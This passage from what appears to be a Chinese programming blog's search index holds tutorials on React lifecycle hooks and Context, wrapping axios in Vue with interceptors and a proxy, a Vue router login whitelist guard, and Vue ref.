language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;6、componentDidUpdate==&gt;更新后最后钩子&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<br />
<p><img src="/img/page/page11.png" alt=""></p>
<br />
<h2 id="卸载">卸载</h2>
<ul>
<li>
<mark class="hl-label green">componentWillUnmount()</mark> ：在组件卸载及销毁之前直接调用。
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;<span class="attr">show</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">show</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">Child</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span>=&gt;</span>this.setState(&#123;show: false&#125;)&#125;&gt;</span></span><br><span class="line"><span class="language-xml">                    删除组件Child</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>组件App<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">    </span><br><span class="line">  <span class="title function_">componentWillUnmount</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;componentWillUnmount==&gt;组件卸载&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>组件Child<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>React快速入门（第四章）</title>
    <url>/React/react_04/</url>
    <content><![CDATA[<h2 id="跨组件传参">跨组件传参</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义最外面定义创建context API</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MyContext</span> = <span class="title class_">React</span>.<span class="title function_">createContext</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;小红&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组件AA</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AA</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">props</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&quot;张三&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setContext = <span class="function">() =&gt;</span>&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&quot;姚明66&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">        <span class="comment">// Provider 数据提供者 提供数据state</span></span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">MyContext.Provider</span> <span class="attr">value</span>=<span class="string">&#123;&#123;name:this.state.name,fun:this.setContext&#125;&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>组件AA<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.setContext&#125;</span>&gt;</span>修改数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">BB</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">MyContext.Provider</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组件BB</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BB</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line">    <span class="comment">// 获取数据 context 订阅单一数据</span></span><br><span class="line">    <span class="keyword">static</span> contextType = <span class="title class_">MyContext</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">h3</span>&gt;</span>组件三BB -- &#123;this.context.name&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.context.fun&#125;</span>&gt;</span>修改数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>axios在vue中的封装使用</title>
    <url>/Vue/axios+vue%E5%B0%81%E8%A3%85/</url>
    <content><![CDATA[<p>简单封装 axios</p>
<hr>
<h1>一、安装axios</h1>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install axios</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save axios vue-axios</span><br></pre></td></tr></table></figure>
<h1>二、创建文件</h1>
<p>在 <strong>src</strong> 目录下创建一个叫 <strong>api</strong> 和 <strong>utils</strong>  的文件夹，主要用于存放请求数据的接口。在utils文件夹下创建一个叫 <strong>request</strong> 的 js 文件，这里的文件夹叫什么无所谓，我这里只是做简单示范。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> service = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">	<span class="comment">// axios中请求配置有baseURL选项，表示请求URL公共部分</span></span><br><span class="line">    <span class="attr">baseURL</span>:<span class="string">&quot;http://localhost:8080&quot;</span>,  <span class="comment">// 这里以这个地址为例，建议写到.env中</span></span><br><span class="line">    <span class="attr">timeout</span>:<span class="number">30000</span>,<span class="comment">//请求超时时间</span></span><br><span class="line">    <span class="attr">headers</span>:&#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json;charset=UTF-8&quot;</span> <span class="comment">//表单数据类型</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">withCredentials</span>: <span class="literal">true</span>   <span class="comment">// 自动获取cookie</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// request  拦截器 发送数据到后台服务器前拦截</span></span><br><span class="line">service.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(</span><br><span class="line">    <span class="function"><span class="params">config</span>=&gt;</span>&#123;</span><br><span class="line">    	<span class="comment">// 可在此配置请求头，设置token,设置loading等</span></span><br><span class="line">        <span class="keyword">return</span> config;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="params">error</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="comment">// console.log(&quot;axios中request报错&quot;,error);</span></span><br><span class="line">        <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// response  拦截器 获取后台数据前拦截</span></span><br><span class="line">service.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">    <span class="function"><span class="params">response</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="comment">// 这里里可以对返回的数据进行处理</span></span><br><span class="line">        <span class="keyword">return</span> response.<span class="property">data</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="params">error</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="comment">// console.log(&quot;axios中response报错&quot;,error);</span></span><br><span class="line">        <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> service;</span><br></pre></td></tr></table></figure>
<p>建议 baseURL写在 <strong>.env</strong> 文件中,如果没有就自己创建</p>
<ul>
<li>.env 全局默认配置文件，不论什么环境都会加载合并</li>
<li>.env.development 开发环境下的配置文件</li>
<li>.env.production 生产环境下的配置文件</li>
</ul>
<p>命名格式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">VUE_APP_NAME</span> = value</span><br></pre></td></tr></table></figure>
<p>VUE_APP_是规定的命名格式，NAME是自定义的变量名。</p>
<p>全局访问格式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">process.<span class="property">env</span>.<span class="property">VUE_APP_NAME</span></span><br></pre></td></tr></table></figure>
<h1>三、请求接口文件</h1>
<p>一般把接口文件集中管理，如登录的就是login.js，请求信息的就info.js,这里以 <strong>src/api</strong> 下创建一个login.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> request <span class="keyword">from</span> <span class="string">&quot;@/utils/request&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 登录 post</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">getLogin</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&quot;/login&quot;</span>,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">        data,  <span class="comment">// 携带的参数</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试 test</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">getTest</span>(<span class="params">params</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&quot;/test&quot;</span>,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="attr">params</span>:,  <span class="comment">// 携带的参数</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>四、配置代理</h1>
<p>在vue.confing.js中配置代理，没有就自己创建</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; defineConfig &#125; = <span class="built_in">require</span>(<span class="string">&#x27;@vue/cli-service&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8081</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">transpileDependencies</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">lintOnSave</span>:<span class="literal">false</span>,</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">  	<span class="attr">host</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">  	port,   <span class="comment">// 请求的端口号</span></span><br><span class="line">    <span class="attr">open</span>: <span class="literal">true</span>,  <span class="comment">// 配置后自动启动浏览器</span></span><br><span class="line">    <span class="attr">overlay</span>: &#123;   <span class="comment">// 让浏览器同时显示警告和错误</span></span><br><span class="line">        <span class="attr">warnings</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">errors</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;/api&#x27;</span>: &#123;  </span><br><span class="line">            <span class="attr">target</span>: process.<span class="property">env</span>.<span class="property">VUE_APP_BASE_URL</span>,  <span class="comment">// 代理地址,如果没有配置就是 http://.... 你自己axios请求的地址</span></span><br><span class="line">            <span class="attr">ws</span>: <span class="literal">true</span>,  <span class="comment">// 如果要代理 websockets，配置这个参数</span></span><br><span class="line">            <span class="attr">changeOrigin</span>: <span class="literal">true</span>,   <span class="comment">// 是否允许跨域</span></span><br><span class="line">            <span class="attr">secure</span>: <span class="literal">false</span>,  <span class="comment">// 如果是https接口，需要配置这个参数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">pathRewrite</span>: &#123;</span><br><span class="line">        <span class="string">&quot;^/api&quot;</span>: <span class="string">&quot;&quot;</span> <span class="comment">// 路径重写,后边还有路径的话，会自动拼接上</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>“<strong>/api</strong>”：当遇到 以 ’ /api ’ 开头的请求，就会把 target 字段加上，请求地址为<a href="http://localhost:8081/api/xxxx">http://localhost:8081/api/xxxx</a><br>
<strong>pathRewrite</strong> ：路径重写，把‘ /api ’ 替换为空，请求地址为 <a href="http://localhost:8081/xxxx">http://localhost:8081/xxxx</a></p>
<h1>五、请求接口</h1>
<p>如在App.vue中请求接口</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; getLogin, getTest &#125; <span class="keyword">from</span> <span class="string">&quot;@/api/login&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123; </span><br><span class="line">	<span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> &#123;</span><br><span class="line">			<span class="attr">username</span>:<span class="string">&quot;张三&quot;</span>,</span><br><span class="line">			<span class="attr">password</span>:<span class="string">&quot;123456&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="title function_">created</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="comment">// 登录</span></span><br><span class="line">		<span class="title function_">getLogin</span>(&#123;</span><br><span class="line">			<span class="attr">username</span>:<span class="variable language_">this</span>.<span class="property">username</span>,</span><br><span class="line">			<span class="attr">password</span>:<span class="variable language_">this</span>.<span class="property">password</span></span><br><span class="line">		&#125;).<span class="title function_">then</span>( <span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(请求成功=&gt;<span class="string">&quot;,res);</span></span><br><span class="line"><span class="string">		&#125;).catch( err =&gt;&#123;</span></span><br><span class="line"><span class="string">			console.log(请求失败=&gt;&quot;</span>,res)</span><br><span class="line">		&#125;);</span><br><span class="line">		<span class="variable language_">this</span>.<span class="title function_">test</span>();</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">methods</span>: &#123;</span><br><span class="line">		<span class="comment">// 测试</span></span><br><span class="line">    	<span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    		<span class="title function_">getLogin</span>(&#123;</span><br><span class="line">    			<span class="attr">id</span>:<span class="number">1</span></span><br><span class="line">			&#125;).<span class="title function_">then</span>( <span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">log</span>(请求成功=&gt;<span class="string">&quot;,err);</span></span><br><span class="line"><span class="string">			&#125;).catch( err =&gt;&#123;</span></span><br><span class="line"><span class="string">				console.log(请求失败=&gt;&quot;</span>,err)</span><br><span class="line">			&#125;)</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>vue路由白名单</title>
    <url>/Vue/vue%E8%B7%AF%E7%94%B1%E7%99%BD%E5%90%8D%E5%8D%95/</url>
    <content><![CDATA[<h1>项目场景：</h1>
<p>例如：网页中有些页面需要登录后才能访问，有些页面不需要，我们需要在页面的前置路由设置白名单，过滤出白名单（不需要登录就可以访问的页面），判断是否需要登录，如果是，就跳到登录页面。</p>
<hr>
<h1>解决方案</h1>
<p>在 src 下建立一个名为 <strong>permission</strong> 的 js 文件，在 main 中引入, 这个判断是否登录的思路是判断有没有 cookie，至于 cookie 存在在哪，看自己的实际情况， permission 代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="comment">// 获取 cookie 的，如果你的cookie 存放在 localStorage ，就用相应的方法判断一下就好</span></span><br><span class="line"><span class="keyword">import</span> &#123; getCookie &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/auth&#x27;</span></span><br><span class="line"><span class="comment">// 这个是一个顶部进度条插件，安装命令: npm install nprogress -S</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">NProgress</span> <span class="keyword">from</span> <span class="string">&#x27;nprogress&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;nprogress/nprogress.css&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否在右边显示一个转圈的动画</span></span><br><span class="line"><span class="title class_">NProgress</span>.<span class="title function_">configure</span>(&#123; <span class="attr">showSpinner</span>: <span class="literal">false</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 白名单（这里是根据路由名字判断的）</span></span><br><span class="line"><span class="keyword">const</span> whiteList = [<span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;register&#x27;</span>]</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="keyword">async</span> (to, <span class="keyword">from</span>, next) =&gt; &#123;</span><br><span class="line">  <span class="title class_">NProgress</span>.<span class="title function_">start</span>()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 有 cookie 这里的 key 值 根据自己的实际来</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">getCookie</span>(<span class="string">&#x27;_TOKEN_&#x27;</span>)) &#123;</span><br><span class="line">    ;[<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;register&#x27;</span>].<span class="title function_">includes</span>(to.<span class="property">name</span>) ? <span class="title function_">next</span>(&#123; <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span> &#125;) : <span class="title function_">next</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 没有 cookie</span></span><br><span class="line">    <span class="keyword">if</span> (whiteList.<span class="title function_">includes</span>(to.<span class="property">name</span>)) &#123;</span><br><span class="line">      <span class="comment">// 在免登录白名单，直接进入</span></span><br><span class="line">      <span class="title function_">next</span>()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_">getCookie</span>(<span class="string">&#x27;_TOKEN_&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (to.<span class="property">name</span> === <span class="string">&#x27;login&#x27;</span>) &#123;</span><br><span class="line">          <span class="title function_">next</span>(&#123; <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span> &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="title function_">next</span>()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (to.<span class="property">name</span> === <span class="string">&#x27;login&#x27;</span>) &#123;</span><br><span class="line">          <span class="title function_">next</span>() <span class="comment">// 否则全部重定向到登录页</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 没有登录，这里跳到登录页面</span></span><br><span class="line">          <span class="title function_">next</span>(<span class="string">`/login?redirect=<span class="subst">$&#123;to.fullPath&#125;</span>`</span>) <span class="comment">// 否则全部重定向到登录页</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">afterEach</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title class_">NProgress</span>.<span class="title function_">done</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>router 中路由写法要对应好名字，如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123; <span class="comment">// 首页</span></span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/home&quot;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;home&quot;</span>,  <span class="comment">// 这里的名字对用白名单的名字</span></span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;@/views/Home.vue&quot;</span>),</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>最后在 main 中引入这个 js 文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./permission&#x27;</span></span><br></pre></td></tr></table></figure>
<h1>跟进(最新写法 — 2023.4.1)</h1>
<p>如果上面写法可能会有过多得 if 判断，那你可以试试这个写法</p>
<ol>
<li>在 router 下的 mate 中加一个属性， 这个名字随意，我这里用 requireAuth</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">routes</span>: <span class="title class_">Array</span>&lt;<span class="title class_">RouteRecordRaw</span>&gt; = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/test&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;@/views/test.vue&#x27;</span>),</span><br><span class="line">    <span class="attr">meta</span>: &#123;</span><br><span class="line">      <span class="comment">// true 就代表着要鉴权，如果为 false 就不需要</span></span><br><span class="line">      <span class="attr">requireAuth</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">keepAlive</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>在 permission 中这么写</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; getCookie &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/auth&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">NProgress</span> <span class="keyword">from</span> <span class="string">&#x27;nprogress&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;nprogress/nprogress.css&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个可以要也可以不要，主要是加载进读条</span></span><br><span class="line"><span class="title class_">NProgress</span>.<span class="title function_">configure</span>(&#123; <span class="attr">showSpinner</span>: <span class="literal">false</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个白名单主要是用于登录后访问一下路由后重定向会首页</span></span><br><span class="line"><span class="keyword">const</span> whiteList = [<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;register&#x27;</span>]</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="keyword">async</span> (to, <span class="keyword">from</span>, next) =&gt; &#123;</span><br><span class="line">  <span class="title class_">NProgress</span>.<span class="title function_">start</span>()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断有无登录，更具你自己的实际情况来</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">getCookie</span>(<span class="string">&#x27;TOKEN&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 已经登录了，如果访问白名单内的路由则重定向回首页</span></span><br><span class="line">    whiteList.<span class="title function_">includes</span>(to.<span class="property">name</span>) ? <span class="title function_">next</span>(&#123; <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span> &#125;) : <span class="title function_">next</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 是否需要鉴权，这个就是在 router meta 声明的 requireAuth</span></span><br><span class="line">    <span class="keyword">if</span> (to.<span class="property">meta</span>.<span class="property">requireAuth</span>) &#123;</span><br><span class="line">      <span class="comment">// 如果需要，就重定向到登录页</span></span><br><span class="line">      <span class="title function_">next</span>(<span class="string">`/login?redirect=<span class="subst">$&#123;to.fullPath&#125;</span>`</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">next</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由跳转结束，关闭加载进度条</span></span><br><span class="line">router.<span class="title function_">afterEach</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title class_">NProgress</span>.<span class="title function_">done</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>ref</title>
    <url>/Vue/ref/</url>
    <content><![CDATA[<h1>ref</h1>
<blockquote>
<p>ref可以做深层响应式</p>
<p>ref可以通过isRef判断是否是ref</p>
<p>ref可以通过unref获取原始数据</p>
</blockquote>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">&lt;script setup lang=<span class="string">&quot;ts&quot;</span>&gt;</span><br><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;count++&quot;</span>&gt;</span>ref: &#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="string">``</span><span class="string">``</span></span><br><span class="line"></span><br><span class="line"># shallowRef</span><br><span class="line"></span><br><span class="line">&gt; shallowRef 只能做浅层响应式</span><br><span class="line">&gt;</span><br><span class="line">&gt; shallowRef 可以通过 isRef 判断是否是 ref</span><br><span class="line">&gt;</span><br><span class="line">&gt; shallowRef 可以通过 unref 获取原始数据</span><br><span class="line"></span><br><span 